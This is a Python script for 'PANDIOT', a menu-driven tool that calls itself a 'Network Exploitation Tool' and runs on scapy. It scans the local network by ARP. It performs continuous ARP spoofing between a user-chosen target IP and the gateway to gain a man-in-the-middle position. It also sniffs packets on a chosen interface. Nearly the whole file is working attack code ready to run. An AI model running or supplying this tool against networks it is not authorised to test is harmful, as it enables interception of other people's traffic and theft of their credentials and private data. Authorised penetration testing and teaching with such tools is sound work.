import os
import sys

# Check for root permission
if os.geteuid() != 0:
    print("\033[91m[✘] Error: Root permissions required. Please run as root (e.g., 'sudo python3 pandiot.py').\033[0m")
    sys.exit()

import scapy.all as scapy
import time
import netifaces
from colorama import Fore, Style

# Function to display the banner
def banner():
    os.system("clear")
    print(Fore.RED + """
██████╗  █████╗ ███╗   ██╗██████╗ ██╗ ██████╗ ████████╗
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██║██╔═══██╗╚══██╔══╝
██████╔╝███████║██╔██╗ ██║██║  ██║██║██║   ██║   ██║   
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║██║   ██║   ██║   
██║     ██║  ██║██║ ╚████║██████╔╝██║╚██████╔╝   ██║   
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝ ╚═════╝    ╚═╝   
""" + Style.RESET_ALL)
    print(Fore.YELLOW + "[+] PANDIOT - Network Exploitation Tool" + Style.RESET_ALL)
    print(Fore.BLUE + "[*] Author: cyber.soluti0ns\n" + Style.RESET_ALL)

# Function to get the gateway IP
def get_gateway_ip():
    try:
        gateway = netifaces.gateways()
        return gateway['default'][netifaces.AF_INET][0]
    except:
        print(Fore.RED + "[!] Error: Could not find gateway IP." + Style.RESET_ALL)
        sys.exit()

# Function to scan the network
def scan_network(ip_range):
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    devices = []
    for element in answered_list:
        devices.append({"IP": element[1].psrc, "MAC": element[1].hwsrc})
    return devices

# Function to perform ARP spoofing
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Function to restore ARP table
def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(packet, count=4, verbose=False)

# Function to get MAC address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

# Function to sniff packets
def sniff_packets(interface):
    print(Fore.GREEN + f"[*] Sniffing on {interface}... Press CTRL+C to stop." + Style.RESET_ALL)
    try:
        scapy.sniff(iface=interface, store=False, prn=lambda pkt: pkt.summary())
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Stopped Sniffing." + Style.RESET_ALL)

# Main function with looping menu
def main():
    while True:
        try:
            banner()
            print(Fore.BLUE + "[1] Scan Network")
            print("[2] ARP Spoof (MITM)")
            print("[3] Sniff Packets")
            print("[4] Exit" + Style.RESET_ALL)

            choice = input(Fore.YELLOW + "\n[?] Choose an option: " + Style.RESET_ALL)

            if choice == "1":
                gateway_ip = get_gateway_ip()
                network_range = f"{gateway_ip}/24"
                devices = scan_network(network_range)
                print(Fore.GREEN + "\nConnected Devices:")
                for device in devices:
                    print(f"IP: {device['IP']} | MAC: {device['MAC']}" + Style.RESET_ALL)
                input(Fore.YELLOW + "\nPress Enter to return to menu..." + Style.RESET_ALL)

            elif choice == "2":
                target_ip = input(Fore.YELLOW + "[?] Enter Target IP: " + Style.RESET_ALL)
                gateway_ip = get_gateway_ip()

                print(Fore.RED + "[!] Press CTRL+C to stop ARP Spoofing..." + Style.RESET_ALL)
                try:
                    while True:
                        spoof(target_ip, gateway_ip)
                        spoof(gateway_ip, target_ip)
                        time.sleep(2)
                except KeyboardInterrupt:
                    restore(target_ip, gateway_ip)
                    print(Fore.GREEN + "\n[+] ARP Spoofing Stopped & Restored." + Style.RESET_ALL)
                input(Fore.YELLOW + "\nPress Enter to return to menu..." + Style.RESET_ALL)

            elif choice == "3":
                interface = input(Fore.YELLOW + "[?] Enter Network Interface (eth0/wlan0): " + Style.RESET_ALL)
                sniff_packets(interface)
                input(Fore.YELLOW + "\nPress Enter to return to menu..." + Style.RESET_ALL)

            elif choice == "4":
                print(Fore.RED + "[!] Exiting BANDIOT..." + Style.RESET_ALL)
                sys.exit()

            else:
                print(Fore.RED + "[!] Invalid Choice" + Style.RESET_ALL)
                input(Fore.YELLOW + "\nPress Enter to return to menu..." + Style.RESET_ALL)

        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] CTRL+C detected. Exiting BANDIOT..." + Style.RESET_ALL)
            sys.exit()

# Run the script
if __name__ == "__main__":
    main()

